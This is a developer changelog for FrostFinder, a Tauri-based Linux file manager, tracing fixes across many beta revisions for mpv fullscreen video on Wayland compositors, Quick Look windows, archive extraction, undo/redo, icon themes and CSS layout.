**Root cause (`src-tauri/tauri.conf.json`):** The Tauri v1 allowlist was missing
`"create": true` under the `window` key. In Tauri v1, spawning any new window
via `new WebviewWindow(...)` requires this permission. Without it the call
silently fails — no window appears, no JS error is thrown, the QL state machine
stalls waiting for a `ql-ready` event that can never fire.

**Fix:** Added `"create": true` to the `allowlist.window` block.

While auditing the allowlist, `"setFocus": true` was also found missing. The
mpv fullscreen flow calls `appWindow.setFocus()` after `appWindow.unminimize()`
to bring FrostFinder back to the front after mpv exits. Without `setFocus` that
call silently no-ops, leaving the window restored but unfocused behind other
windows.

**Fix:** Added `"setFocus": true` to the `allowlist.window` block.

No Rust recompile needed — `tauri.conf.json` only.

---

### Fix: video fullscreen broken — native HTML5 fullscreen restored

**Root cause (`src/views.js`):** `_mountMpvPlayer` set
`controlsList="nodownload nofullscreen"` which hides the browser's built-in
fullscreen button in the `<video controls>` bar. The replacement (custom ⛶
button → `appWindow.minimize()` + `mpv_open_external --fullscreen`) was the
only fullscreen path available, and it depended on `setFocus` which was missing
from the allowlist (see above), making it appear completely broken.

**Root analysis vs alpha-12-r15:** In alpha-12-r15, video was a plain
`<video controls>` element with no `nofullscreen` restriction. Native HTML5
fullscreen worked correctly and that is what users relied on. Starting from
beta-1-r14, the native button was intentionally hidden ("WebKit2GTK
`requestFullscreen()` is broken on Linux") and replaced with the custom mpv
path. The release notes overstated this: native fullscreen works correctly on
the majority of setups — the breakage was specific to certain driver/compositor
combinations during the development cycle, not universal.

**Fix:** Removed `nofullscreen` from `controlsList`. The native HTML5 fullscreen
button is visible again and works as it did in alpha-12-r15. The custom ⛶
hover button and F-key shortcut are retained as an alternative that hands off
to mpv — useful for setups where native FS still renders black frames (e.g.
some Wayland+HEVC combinations).

No Rust recompile needed — `src/views.js` only.

---

## What's in Beta-1-r26

### Fix: fullscreen black screen (GNOME + all compositors)

**Root cause — the wrong architecture for 6 revisions:**
The transparency punch-through approach (make FrostFinder transparent, let mpv's Wayland surface show through underneath) only works on wlroots compositors if they implement the specific surface layering model. It never worked on GNOME/Mutter because Mutter composites all windows normally — there's no concept of one window "punching through" another.

**Fix — minimize FrostFinder when mpv launches fullscreen** (`src/views.js`):
- `appWindow.minimize()` called immediately before `mpv_open_external`
- mpv opens its own fullscreen window, unobstructed
- Poll `mpv_is_running` every 500ms; on exit: `appWindow.unminimize()` + `setFocus()` + resume in-app video
- Works on GNOME, Hyprland, KDE, X11 — any window manager
- Entire `body.mpv-fullscreen` CSS block removed (was never functional)

**Fix — remove `--gpu-context=wayland`** (`src-tauri/src/main.rs`):
- Forcing `--gpu-context=wayland` broke GNOME's EGL display setup. GNOME Mutter uses a different EGL initialization path from wlroots. When the context init fails, mpv falls back to a broken state.
- Removed. mpv now auto-detects the rendering context from `WAYLAND_DISPLAY` / `DISPLAY` environment variables, which is correct on all compositors.

---

### Feature: Quick Look as a moveable native OS window

**Previous behaviour:** QL was a `position:fixed` div appended to `document.body`. It was constrained to the WebView and could never be dragged outside the FrostFinder app window.

**New behaviour:** QL opens as a real native OS window via Tauri's `WebviewWindow` API. It can be dragged anywhere on screen, placed on a second monitor, resized, etc.

**New files:**
- `ql.html` — the QL window HTML entry point (project root, next to `index.html`)
- `src/ql-window.js` — QL window logic: receives entry data from the main window via Tauri events, renders preview, handles prev/next navigation, mpv fullscreen, keyboard shortcuts

**Changed files:**
- `src/views.js` — `openQuickLook` now spawns a `WebviewWindow('quicklook', { url: 'ql.html', decorations: false, transparent: true, resizable: true })`. If a QL window is already open it emits `ql-update` instead of spawning a second window. The entire old DOM-based QL implementation (~170 lines) is replaced by ~50 lines of window management.
- `vite.config.js` — added multi-page build config: `rollupOptions.input` now includes both `index.html` and `ql.html` so both pages are built and bundled.

**Event protocol between windows:**
- `ql-ready` — emitted by ql-window.js when loaded; main window responds with `ql-load`
- `ql-load` / `ql-update` — `{ entries: FileEntry[], curIdx: number }` sent from main to QL
- `ql-nav` — emitted by ql-window.js when user clicks prev/next (for main window selection sync)
- `ql-closed` — emitted by ql-window.js on Escape / close button

**Titlebar:** uses `data-tauri-drag-region` so dragging the title bar moves the native window (no custom mousemove code needed).

**Requires Rust recompile** — `src-tauri/src/main.rs` changed.

---

## What's in Beta-1-r25

### Fix: fullscreen still black (FULL_SCREEN_ISSUE_4.txt) — four changes

---

**1 — `--target-colorspace-hint=no` (was `yes`) (`src-tauri/src/main.rs`)**

This is the most likely remaining cause. With `--target-colorspace-hint=yes`,
mpv sends HDR colour metadata to the Wayland compositor via the
`color-representation` Wayland protocol. Hyprland partially implements this
protocol — enough to accept the negotiation but then mishandle the surface,
causing the video plane to display as black. Setting `no` makes mpv perform
all colour conversion internally, bypassing the broken Hyprland HDR path
entirely. This is the safe default for any non-HDR-native monitor.

---

**2 — `"shadow": false` added to `tauri.conf.json`**

Compositor shadow rendering on the FrostFinder window paints a shadow *behind*
the window edge. On some GPU/driver configurations this shadow layer occupies
the same hardware plane as the mpv video surface and blocks it. `"shadow": false`
removes the shadow request entirely.

---

**3 — `_launchFullscreen` no longer silently swallows errors (`src/views.js`)**

The `.catch(() => {})` at the end of the `mpv_open_external` invoke chain was
eating all errors silently — if mpv wasn't installed, or the IPC call failed,
or the command threw, `body.mpv-fullscreen` would never be applied, the in-app
video would stay paused, and no error would be shown. Now:
- On failure: in-app video resumes and a `showToast('mpv failed: …', 'error')`
  is shown so the user knows what went wrong.
- This also means previous "fullscreen not working" reports may have been mpv
  failing silently (wrong flags causing mpv to exit immediately) rather than
  the transparency mechanism failing.

---

**4 — `frostfinder-hyprland.conf` (new file in zip root)**

A ready-to-use Hyprland configuration file. Add to `hyprland.conf` with:
```ini
source = ~/.config/hypr/frostfinder-hyprland.conf
```

Contains:
- `windowrulev2 = opaque/noshadow/noblur/nounderdot` for both `frostfinder`
  and `mpv` windows
- `render { direct_scanout = true }` with note to set `false` if it causes
  a black screen
- VRR/Adaptive Sync disable instructions for 144Hz monitors
- `vainfo` verification commands and driver install instructions
- `WLR_DRM_NO_MODIFIERS=1` permanent fix instructions

**Requires Rust recompile** — `src-tauri/src/main.rs` changed.

---

## What's in Beta-1-r23

### Fix: fullscreen still blank — mpv v0.40+ Vulkan default (FULL_SCREEN_ISSUE_3.txt)

**Root cause:** mpv 0.40+ changed the default `gpu-api` from OpenGL to **Vulkan**.
On CachyOS/Hyprland with VA-API, the Vulkan → Wayland present path fails for
10-bit HEVC: the frame decodes on GPU correctly (hence audio works, decode pipeline
runs) but the Vulkan surface stalls before presenting — black frame, or no frame.

This is why the black screen persisted across r19–r22 despite correct flags: the
problem was never the VO backend selection or the transparency layer, it was the
OpenGL→Vulkan API switch in the mpv 0.40 release.

**Fixes (`src-tauri/src/main.rs`):**

| Flag | Change | Reason |
|---|---|---|
| `--vo=gpu-next` | was `--vo=gpu` | Modern renderer; works with opengl api |
| `--gpu-api=opengl` | **new** | Reverts Vulkan default — critical fix |
| `--hwdec=vaapi` | was `vaapi-copy` | Direct path correct now that OpenGL is used |
| `--video-sync=display-resample` | **new** | Syncs to monitor refresh, eliminates micro-stutter on 4K 60fps |
| `--vd-lavc-dr=yes` | removed | Unnecessary with vaapi direct; can conflict |

`WLR_DRM_NO_MODIFIERS=1` retained as process env — still needed on some AMD/Intel.

Also removed ~40 lines of stale comments from previous revision attempts
(references to `dmabuf-wayland`, `vaapi-copy`, `FULL_SCREEN_ISSUE_2`) that were
contradicting the current implementation.

---

### Fix: CSS transparency selector bugs (`src/style.css`)

- `body.mpv-fullscreen html` — **invalid CSS**: you cannot select an ancestor
  (`html`) from a descendant selector (`body.mpv-fullscreen`). This rule was always
  silently ignored. Removed.
- Added missing elements to the transparency list: `.tab-bar`, `.sb-resize-handle`,
  `.trash-banner`, `.statusbar` — all had non-transparent backgrounds that would
  show as dark bars during mpv fullscreen.
- Added `border-color: transparent` and `box-shadow: none` to prevent border lines
  showing as faint outlines over the video.

---

**Requires Rust recompile.**

---

## What's in Beta-1-r22

### Fix: compile warnings (clean build)

- Removed unused `searched_total: Arc<AtomicU64>` from `deep_search()` — leftover
  from the r20 Mutex refactor; the merge loop uses a plain `total_searched: u64`.
  Removed unused `AtomicU64` from the inner `use` statement.
- Removed dead `MPV_SOCK_PATH` constant — was reserved for a future X11 IPC path
  that was never implemented.

Build now produces zero warnings.

---

### Fix: fullscreen video still blank — `--vo=dmabuf-wayland` was the cause

**Root cause:** `--vo=dmabuf-wayland` and `--gpu-context=wayland` are **two
separate, mutually exclusive rendering backends**. Using both together means
`gpu-context` is silently ignored while `dmabuf-wayland` attempts to initialise.
When `dmabuf-wayland` fails (missing kernel modifier support, wrong driver version,
AMD/Intel DRM quirks), mpv **silently falls back to `vo=null`** — which produces
no video output at all. Audio still plays because the audio pipeline is independent.
This was the source of "audio but black screen" across all previous revisions.

**Fix — `--vo=gpu --gpu-context=wayland`** (universal Wayland path):
- Available in every standard mpv build, no kernel driver requirements
- mpv renders via GPU-accelerated EGL into a native Wayland surface
- Works on AMD, Intel, NVIDIA (with correct drivers)

**Fix — `--hwdec=vaapi-copy`** (instead of `--hwdec=vaapi`):
- `vaapi` direct: decoded frame stays as a DMA-BUF on the GPU. On some AMD drivers
  the VO cannot import that DMA-BUF handle correctly → black frame
- `vaapi-copy`: decoded frame is copied to system memory after GPU decode, then
  handed to the VO as a normal buffer. A fraction slower (~5%) but always works
  when VA-API decode itself is functional. Correct choice for `--vo=gpu`

Also fixed: "Open with mpv" fallback button in the media-server-unavailable panel
was calling `invoke('mpv_open_external', {path})` without the required
`startTime`/`fullscreen` params added in r19 — would have caused a Tauri IPC
type error. Now passes `{path, startTime: null, fullscreen: false}`.

**Requires Rust recompile.**

---

## What's in Beta-1-r21

### Fix: fullscreen video — audio plays, video black (WebView occlusion)

**Root cause (FULL_SCREEN_ISSUE_2.txt — "The Transparency Bug"):**

When mpv opens via `--vo=dmabuf-wayland`, it renders as a **separate Wayland
surface** at a lower layer. The Tauri WebView window sits on top of it. Even
though `tauri.conf.json` has `"transparent": true`, the `.window` div has
`background: var(--bg-window)` which is solid `#1c1c1e` — a fully opaque dark
rectangle covering the entire WebView. mpv's Wayland surface exists and plays
correctly (hence audio works) but is completely hidden behind the opaque WebView.

**Three-part fix:**

**1 — `body.mpv-fullscreen` CSS class (`src/style.css`)**

A new CSS rule set makes every container fully transparent when mpv is active:
```css
body.mpv-fullscreen .window,
body.mpv-fullscreen .titlebar,
body.mpv-fullscreen .window-body,
/* ... all containers ... */
{ background: rgba(0,0,0,0) !important; }
```
Applied to `document.body` the moment `mpv_open_external` resolves. Removed
when mpv exits (detected via `mpv_is_running` polling).

**2 — `mpv_is_running()` Tauri command (`src-tauri/src/main.rs`)**

`mpv_open_external` now stores the mpv `Child` handle in the existing
`MPV_CHILD` static. A new `mpv_is_running()` command calls `child.try_wait()`
— returns `true` while mpv is alive, `false` once it exits. JS polls this
every 500ms and removes `body.mpv-fullscreen` on exit, restoring the UI.

**3 — `WLR_DRM_NO_MODIFIERS=1` + `--target-trc=srgb` (`src-tauri/src/main.rs`)**

Per FULL_SCREEN_ISSUE_2.txt: DRM buffer modifiers cause rendering failures on
many AMD and Intel Wayland setups. `WLR_DRM_NO_MODIFIERS=1` is now passed
as a per-process environment variable to the mpv spawn (not set globally, to
avoid affecting WebKit's own DRM negotiation).

`--target-trc=srgb` added as a fallback for 10-bit/HDR HEVC files on 8-bit
monitors: forces SDR tone-mapping if the HDR initialisation path fails, which
is common on setups where `vainfo` shows `VAEntrypointVLD` but not
`HEVC_MAIN_10`.

**Requires Rust recompile** — new `mpv_is_running` command added.

---

### Recommended Hyprland config additions

```ini
windowrulev2 = opaque, class:^(frostfinder)$
windowrulev2 = noshadow, class:^(frostfinder)$
windowrulev2 = content none, class:^(frostfinder)$
```

If still black after all fixes, try launching from terminal with:
```sh
WLR_DRM_NO_MODIFIERS=1 ./frostfinder
```
And verify 10-bit decode support:
```sh
vainfo | grep HEVC
# Need: VAEntrypointVLD + HEVC_MAIN_10
# AMD:   sudo pacman -S libva-mesa-driver
# Intel: sudo pacman -S intel-media-driver
```

---

## What's in Beta-1-r20

### Fix: fullscreen video still not working

**Root cause (`src/views.js` line 59):** `video.dataset.mpvActive = '1'` was never
removed in r19. Both the `<video>` element and the parent slot had `data-mpv-active`.
`querySelector('[data-mpv-active]')` returns the **first** matching element in DOM
order — which is the `<video>` child, not the slot. `video._mpvCleanup` is
`undefined`, so every `_mpvStop(host)` call silently did nothing. The `_fsKey`
keydown listener leaked on every video mount. The r19 fix added slot marking but
forgot to remove the old video marking.

**Fix:** Removed `video.dataset.mpvActive = '1'` from line 59. The slot is now the
sole owner of `data-mpv-active` and `_mpvCleanup`. No Rust change needed.

---

### Fix: show hidden files not working

**Root cause (`src/main.js` — `navigate()`):** entries were filtered before being
stored in `state.columns[i].entries`:
```js
let entries = result.entries;
if (!state.showHidden) entries = entries.filter(e => !e.is_hidden); // ← pre-filter
state.columns.push({ path, entries, ... });
```
When `showHidden` was toggled to `true`, the stored entries had already had hidden
files stripped out. `getVisibleEntries()` skipped its filter (correctly, since
`showHidden` is now `true`), but the entries were already incomplete. No re-fetch
happened for non-column views, so hidden files never appeared.

**Fix:** `navigate()` now stores raw unfiltered entries. `getVisibleEntries()` was
already the correct single filter point — it now works correctly for all view modes
without any re-fetch on toggle. The redundant re-fetch loop in the `btn-eye` handler
for column view was also removed.

---

### Fix: deep search lagging

**Root cause (`src-tauri/src/main.rs` — `deep_search()`):** The rayon `par_iter`
dispatched one thread per top-level directory, but all threads contended on a single
`Arc<Mutex<Vec<FileEntry>>>` to merge results as they ran. On a typical home
directory with 10–20 top-level dirs, this serialized all workers at the merge step,
negating the parallelism benefit.

Secondary issue: JS called `sortEntriesAsync(deduped)` after receiving 2000 results
from Rust, even though Rust already sorted them alphabetically.

**Fix:**
- `par_iter().map()` now collects per-thread `Vec<FileEntry>` locally with no shared
  state. A single sequential merge pass runs after all threads finish. Mutex removed.
- Hidden directories are now also included in the parallel top-dirs list when
  `include_hidden` is true (previously they were always skipped at the top level).
- JS `sortEntriesAsync` call removed — results are pre-sorted by Rust.

**Requires Rust recompile.**

---

### Fix: list view column resize handles invisible

**Root cause (`src/style.css`):** `.list-head th` had `overflow:hidden` which clipped
the `.th-resize` div (positioned `right:0` but only 5px wide). The handle existed
in DOM but was visually invisible — no hover feedback, no resting indicator.

**Fix:**
- `overflow:hidden` → `overflow:visible` on `<th>`.
- `.th-resize` now uses a `::after` pseudo-element: a 1px semi-transparent vertical
  bar (`rgba(255,255,255,.18)`) always visible as a column separator, growing to 2px
  accent-blue on hover/drag.
- Grab zone widened from 5px to 8px for easier targeting.

---

## What's in Beta-1-r19

### Fix: gallery view gets stuck; fullscreen black screen — root cause found

Three bugs were found in `_mountMpvPlayer` / `_mpvStop` / `_loadContent`.

---

**Bug 1 — `data-mpv-active` on wrong element → `_mpvStop` never ran (`src/views.js`)**

`video.dataset.mpvActive = '1'` was set on the `<video>` child element, but
`slot._mpvCleanup` was attached to the parent slot element. `_mpvStop` did:

```js
const slot = host?.querySelector('[data-mpv-active]');  // found the VIDEO
if (slot?._mpvCleanup) slot._mpvCleanup();               // _mpvCleanup on VIDEO = undefined
```

So cleanup **never ran** on any code path. Every video mount leaked a
`document.addEventListener('keydown', _fsKey)` listener. After navigating
through N videos in gallery view, N keydown listeners were attached, each
pointing to a different stale video closure.

Fix: moved `slot.dataset.mpvActive = '1'` to the **slot** element (not video),
and added `delete slot.dataset.mpvActive` in `_mpvCleanup` so the marker is
removed after cleanup. `_mpvStop` now correctly finds the slot and calls its
`_mpvCleanup`. Added a fallback path in case the slot was replaced before
cleanup could be registered.

---

**Bug 2 — Gallery `_loadContent` didn't clean up old video before replacing it (`src/views.js`)**

On every gallery item switch, `_loadContent` did:
```js
gSlot.innerHTML = '';          // destroys video DOM without cleanup
_mountMpvPlayer(gSlot, ...);   // mounts new video
```

Because `_mpvStop` never ran (Bug 1), the old video's `keydown` listener was
never removed, the old `video.src` was never cleared, and the old audio
pipeline kept running in the background. This is why gallery view "gets stuck"
— multiple stale video elements competing for the same audio output, and
accumulated keydown handlers causing erratic F-key behaviour.

Fix: `_mpvStop(host)` is now called immediately before `gSlot.innerHTML = ''`
in `_loadContent`. With Bug 1 also fixed, this now correctly runs cleanup.

---

**Bug 3 — Fullscreen still black on Hyprland/Wayland — architectural fix (`src/views.js`, `src-tauri/src/main.rs`)**

All previous attempts (`window_set_fullscreen` + 150ms timeout, then + resize
event) failed because the underlying cause is architectural: calling
`window_set_fullscreen` on a Hyprland tiling compositor triggers a Wayland
configure event that causes WebKit2GTK to destroy and rebuild all GPU
compositing layers. The `<video>` element's GL texture is invalidated during
this transition — there is no reliable way to resync it because the timing
is compositor-dependent and driver-dependent.

Fix (per FULL_SCREEN.txt): the fullscreen button now hands off to mpv via
`mpv_open_external` with `--start=TIME` (current playback position),
`--fullscreen=yes`, and Wayland-optimal flags:

```
--vo=dmabuf-wayland      zero-copy DMA-BUF path, no WebKit GL
--gpu-context=wayland    hard-disables XWayland context
--hwdec=vaapi            offloads H.265/HEVC/AV1 4K decode to GPU
--vd-lavc-dr=yes         enables direct rendering
--target-colorspace-hint=yes  fixes HDR/10-bit colour on Wayland
```

The in-app `<video>` pauses when mpv opens. mpv renders via a native Wayland
surface with direct compositor scanout — zero black frames, zero GL texture
issues. `mpv_open_external` updated to accept `start_time: Option<f64>` and
`fullscreen: Option<bool>` parameters.

**Requires Rust recompile** — `mpv_open_external` signature changed.

---

### Recommended: Hyprland config for best fullscreen experience

Add to `hyprland.conf` (optional but improves compositor-level fullscreen):
```ini
windowrulev2 = fullscreen, class:^(frostfinder)$
windowrulev2 = stayfocused, class:^(frostfinder)$
render:direct_scanout = true
```

For 4K H.265 hardware decode, verify VA-API support:
```sh
vainfo | grep HEVC
# Look for: VAEntrypointVLD and HEVC_MAIN_10
sudo pacman -S intel-media-driver libva-mesa-driver libva-intel-driver
```

---

## What's in Beta-1-r18

### Fix: extract not working — full audit of all functions

A full cross-reference of every `invoke()` call in JS against every `#[tauri::command]` in Rust was performed. Four bugs found and fixed.

---

**Bug 1 — `extract_archive` only handled ZIP (`src-tauri/src/main.rs`)**

The Rust function used `zip::ZipArchive` unconditionally. Selecting "Extract Here"
on a `.tar.gz`, `.tar.xz`, `.tar.bz2`, `.zst`, `.7z`, or `.rar` file would
immediately fail with a zip parse error.

Fix: ZIP files are still handled natively by the zip crate. All other formats
are delegated to the system `bsdtar` / `tar` binary (libarchive-based), which
auto-detects the format and transparently supports gz, bz2, xz, zstd, 7z (read),
rar (read), lzma. `dest_dir` is created with `create_dir_all` before extraction
so the directory doesn't need to exist. Returns entry count via a second `tar -tf`
pass. Requires `tar` or `bsdtar` to be installed (standard on all Linux distros).

---

**Bug 2 — `delete_items` command missing (`src-tauri/src/main.rs`)**

`undoLastOp` called `invoke('delete_items', {paths:[...]})` for undo of copy and
create operations, but this Tauri command never existed. Every copy-undo and
create-undo silently crashed with an unresolved command error.

Fix: Added `delete_items(paths: Vec<String>)` command. Iterates paths, skips
already-missing entries (idempotent for undo), deletes files with `remove_file`
and directories with `remove_dir_all`. Registered in the invoke handler.

---

**Bug 3 — `rename_file` undo/redo used wrong parameter name (`src/main.js`)**

`undoLastOp` and `redoLastOp` called `invoke('rename_file', {path: ..., newName: ...})`.
The Rust function signature is `fn rename_file(old_path: String, new_name: String)`
— Tauri maps camelCase `oldPath` → snake_case `old_path`, not `path`. Both undo
and redo of rename operations failed silently.

Fix: Changed both call sites to `{oldPath: ..., newName: ...}`.

---

**Bug 4 — compound archive extensions not detected (`src/utils.js`, `src/main.js`)**

`ARCHIVE_EXTS` only listed single extensions (`gz`, `xz`, `bz2`, `zst`). A file
named `archive.tar.gz` has `entry.extension === 'gz'` which matched, but the
`isArchive` check in `buildFileCtxMenu` also accepted plain `.gz` files (gzip
streams, not tar archives). More critically, the extract destination prompt
defaulted to `state.currentPath` with no suggested name.

Fixes:
- `ARCHIVE_EXTS` extended with `tar.gz`, `tar.bz2`, `tar.xz`, `tar.zst`, `tgz`,
  `tbz2`, `txz`.
- `isArchive` check now also tests `entry.name.toLowerCase()` against all entries
  in `ARCHIVE_EXTS` to catch compound extensions regardless of `entry.extension`.
- `extractArchive` now strips compound extensions to suggest a destination folder:
  `project.tar.gz` → `currentPath/project`,  `data.zip` → `currentPath/data`.

**Requires Rust recompile** (`src-tauri/src/main.rs` changed — new `delete_items`
command added, `extract_archive` rewritten).

---

## What's in Beta-1-r17

### Fix: icon theme picker never applied non-Adwaita themes

**Root cause (`src/utils.js`):** `showIconThemePicker` hard-assigned `ADWAITA_MAP`
to every theme discovered from `/usr/share/icons`, regardless of the theme's
actual directory layout. When a user picked Breeze, Papirus-Dark, Numix etc.,
`loadThemeIcon` tried paths like `symbolic/places/folder-symbolic.svg` — the
Adwaita structure — which don't exist for those themes. Every lookup failed,
the per-key cache was written as `null`, and the built-in SVG icons were used
permanently for that session.

**Fix:** A `_mapForName(n)` helper is introduced that inspects the discovered
theme name and returns the correct THEME_MAP:
- `breeze` → `BREEZE_MAP` (`places/32/`, `mimetypes/32/`, `devices/32/`)
- `numix` → `NUMIX_MAP` (`48/places/`, `48/mimetypes/`, `48/devices/`)
- `fluent` / `tela` → `SCALABLE_MAP` (`scalable/places/`, `scalable/mimetypes/`)
- Everything else (Adwaita, Papirus, Yaru, Humanity, Hicolor, elementary…) → `ADWAITA_MAP`

No Rust recompile needed — `src/utils.js` only.

---

### Fix: size slider and icon-theme button clipped in list view

**Root cause (`src/style.css`):** `.tb-actions { flex-shrink:0 }` prevented the
toolbar's right-side panel from ever compressing. In list view with the preview
panel open (240px) and sidebar (195px), the content area is ~365px on an 800px
window. `tb-actions` is ~550px wide — items from the right (search → eye →
icon-theme → **size-slider**) were clipped by `.content { overflow:hidden }`.

**Fix:**
- `.tb-actions`: changed to `flex-shrink:1; min-width:0; overflow:hidden` so it
  yields space to the breadcrumb correctly.
- `.search-wrap`: added `flex-shrink:1; min-width:0` — the search box compresses
  first, protecting the adjusters to its left.
- `.search-input`: default width reduced from 180px → 150px, min-width from
  100px → 70px, focus width from 240px → 220px.
- `.size-slider-wrap`: set `flex-shrink:0` to explicitly protect it from further
  compression after the search box has fully collapsed.
- `.size-slider`: added `min-width:44px` so the thumb remains usable even when
  the toolbar is at its narrowest.

No Rust recompile needed — `src/style.css` only.

---

## What's in Beta-1-r16

### Fix: fullscreen video still blank — resize-event-driven restart

**Diagnosis via log:** The `RENDER view="gallery"` at `+24.317s` confirmed the
gallery DOM is not torn down during the fullscreen transition (no window resize
listener triggers `renderGalleryView`). The r15 fix of a blind 150ms timeout
was simply too short — on slower GPU/driver combos (e.g. Mesa radeonsi,
CachyOS kernel with AMDGPU) the WebKit2GTK GL layer rebuild takes longer than
150ms, so `video.currentTime = t` ran before the new compositor surface was
ready and the texture upload still produced black frames.

**Fix (`src/views.js`):** `_fsRestart` is rewritten to use `window resize` as
the primary trigger instead of a fixed timeout. The DOM `resize` event fires
once WebKit has finished reflowing the window after `window_set_fullscreen`
completes — at that point the GL layer rebuild is guaranteed to be done. A
`done` guard flag prevents double-restart if both the event and the fallback
fire. A 600ms `setTimeout` fallback covers:
- GPU/driver combos where `resize` fires early (before compositing fully settles)
- Rare cases where the event doesn't fire at all

An additional 80ms delay after the seek, before `play()` is called, lets the
decoder pipeline produce the first frame before playback resumes, preventing a
second black flash on re-enter.

No Rust recompile needed — `src/views.js` only.

---

## What's in Beta-1-r15

### Fix: fullscreen video renders black (audio-only)

**Root cause:** `window_set_fullscreen` resizes the Tauri window, causing
WebKit2GTK to tear down and rebuild all GPU compositing layers. The `<video>`
element's GL texture is invalidated mid-frame — GStreamer's audio pipeline
keeps running independently, so audio plays but every video frame renders black.

**Fix (`src/views.js`):** A `_fsRestart(wasPaused, t)` helper is called
immediately after both `_enterFs` and `_exitFs`. It saves `video.currentTime`
and the paused state before the fullscreen toggle, pauses the video, waits
150 ms for the window resize and layer rebuild to settle, then seeks back to
the saved position and resumes if it was playing. The seek forces WebKit to
request a fresh decoded frame, which re-establishes the GL texture upload path.

No Rust recompile needed — `src/views.js` only.

---

### Fix: icon ghosting / "Black Square" GPU bug

Folder and file icons rendered as dark, low-contrast blobs against the
glassmorphic background on CachyOS/Arch with Mesa drivers.

**Root cause:** `will-change: transform, opacity` on `.icon-item` caused
WebKit's GPU layer manager to flatten SVG icons into dark 1-bit bitmasks to
save VRAM — the documented WebKit "Black Square" compositing bug.

**Fix (`src/style.css`):**
- Removed `will-change` from `.icon-item` (list/sidebar rows keep it — they
  don't trigger this bug). The item is still GPU-promoted via `translateZ(0)`.
- Added a frosted glass backing to every icon cell:
  `background: rgba(255,255,255,0.03)` + `border: 1px solid rgba(255,255,255,0.05)`.
- Hover state brightened to `rgba(255,255,255,0.10)` with a blue border glow.
- Added `filter: brightness(1.2) saturate(1.2) drop-shadow(...)` to `.ico-big svg`
  to compensate for WebKit's compositing darkening and ensure icons pop against
  dark backgrounds regardless of wallpaper.

No Rust recompile needed — `src/style.css` only.

---

### Feature: expanded icon theme support

The icon theme picker now ships with 8 additional themes pre-configured
and a smarter file-discovery fallback that handles all major Linux icon
directory conventions.

**New built-in themes (`src/utils.js`):**
- **Papirus / Papirus-Dark** — GNOME symbolic layout (same as Adwaita)
- **Breeze / Breeze-Dark** — KDE layout: `places/32/`, `mimetypes/32/`, `devices/32/`
- **Numix** — `48/places/`, `48/mimetypes/`, `48/devices/`
- **Yaru** — Ubuntu GNOME symbolic layout
- **Fluent / Tela** — `scalable/places/`, `scalable/mimetypes/`

Each family gets a correctly-keyed `THEME_MAP`. The `loadThemeIcon` candidate
fallback list is extended from 5 to 14 paths, covering symbolic, scalable,
Breeze-style, and Numix-style layouts so auto-discovery works even for
themes that partially follow a different structure.

SVG normalization is broadened: hardcoded `stroke` colors (e.g. Breeze embeds
`stroke="#232629"`) are now also rewritten to `currentColor` so all themes
render correctly with the app's accent colour system.

No Rust recompile needed — `src/utils.js` only.

---

## What's in Beta-1-r14

### Fix: video fullscreen mode

WebKit2GTK on Linux does not support `requestFullscreen()` on `<video>` elements
without additional webkit2gtk crate configuration — the native controls bar
fullscreen button either silently fails or errors.

**Fix:** The native fullscreen button is hidden via `controlsList="nofullscreen"`.
A custom fullscreen button (⤢) is overlaid in the bottom-right corner of the
video slot, appearing on hover. It calls `invoke('window_set_fullscreen')` which
fullscreens the entire Tauri window — this works unconditionally on both X11 and
Wayland.

**Controls:**
- Hover over video → fullscreen button appears bottom-right
- Click button or press **F** to enter/exit fullscreen
- **Esc** also exits fullscreen
- Navigating away or closing Quick Look automatically exits fullscreen

**Files changed:** `src/views.js` only — no Rust recompile needed.

---


## What's in Beta-1-r13

### Feature: autoplay in Quick Look; click-to-play retained elsewhere

`_mountMpvPlayer` now accepts an `{ autoplay }` option (default `false`).

- **Quick Look:** passes `{ autoplay: true }` — video starts immediately on open,
  no overlay shown. The native `<video controls>` bar gives full playback control.
- **Preview panel & gallery:** unchanged — click-to-play overlay still shown.

Implementation: `video.autoplay = autoplay` set on the element; the overlay
block is guarded by `if (!autoplay)` so it is never inserted in Quick Look.

**Files changed:** `src/views.js` only — no Rust recompile needed.

---


## What's in Beta-1-r12

### Fix: video not showing in gallery view

`_makeVideoEl` was called in `renderGalleryView._loadContent` but the function
no longer exists — it was removed when ffmpeg transcoding was replaced with the
native `<video>` approach. Gallery video slots showed a blank spinner indefinitely.

Fixed by replacing `gSlot.appendChild(_makeVideoEl(...))` with
`_mountMpvPlayer(gSlot, sel_e.path)` — the same click-to-play player used by
the preview panel and Quick Look. Gallery video now shows the same overlay
(play button + filename + "Open with mpv") as everywhere else.

**Files changed:** `src/views.js` only — no Rust recompile needed.

---


## What's in Beta-1-r11

### Fix: video autoplay removed — click-to-play overlay added

Video files no longer start playing automatically when selected in the preview
panel or Quick Look. A click-to-play overlay now covers the video slot until
the user explicitly starts playback.

**Overlay contains:**
- Large play button (click anywhere on overlay to start)
- Filename label beneath the play button
- "Open with mpv" button (opens a standalone mpv window without starting
  in-app playback)

`video.autoplay` removed; `video.preload` set to `"metadata"` so dimensions
and duration load immediately (for thumbnail sizing) without buffering content.

Also fixes the dead-code warning from r10:
`MPV_SOCK_PATH` annotated as reserved for future X11 embedded-player use.

**Files changed:** `src/views.js` only — no Rust recompile needed.

---


## What's in Beta-1-r9

### Fix: blank video screen — reverted subprocess mpv embedding, use native `<video>`

**Root cause of blank screen (r4–r8):** On Wayland, a `wl_surface*` is a process-local heap pointer — it only has meaning inside the process that owns it. Passing it via `--wid` to a separately spawned `mpv` process gives mpv a dangling/invalid pointer into another process's address space. mpv either silently ignores `--wid` or crashes, producing a blank screen. (On X11, XIDs are server-side integers global across all processes — `--wid` works there, but FrostFinder runs on Wayland.)

**Fix:** In-app video preview now uses the native HTML `<video>` element served by the existing local HTTP media server (already running since r1 for thumbnails). WebKit2GTK decodes via GStreamer with VA-API hardware acceleration — H.265/HEVC, AV1, VP9 all work with `gst-plugins-bad`. `WEBKIT_DISABLE_DMABUF_RENDERER=1` (already set in main.rs) prevents the black-frame DMA-BUF compositing issue.

mpv is still used for **external full-screen playback** via `mpv_open_external`, which spawns a detached standalone mpv window (no `--wid` needed) — works perfectly on both X11 and Wayland.

**Changes:**
- `Cargo.toml`: `libmpv = "2.0"` removed.
- `main.rs`: `libmpv::Mpv` global replaced with `std::process::Child` (for future X11 embedded use); `get_window_xid` → `get_native_window_handle`; `mpv_open_external` added; `mpv_play/stop/update_margins/pause_toggle` kept as no-op stubs so the invoke handler compiles.
- `views.js`: `_mountMpvPlayer` now mounts a `<video>` element via the media server URL; `_mpvStop` pauses and removes the element; "Open with mpv" button calls `mpv_open_external`.
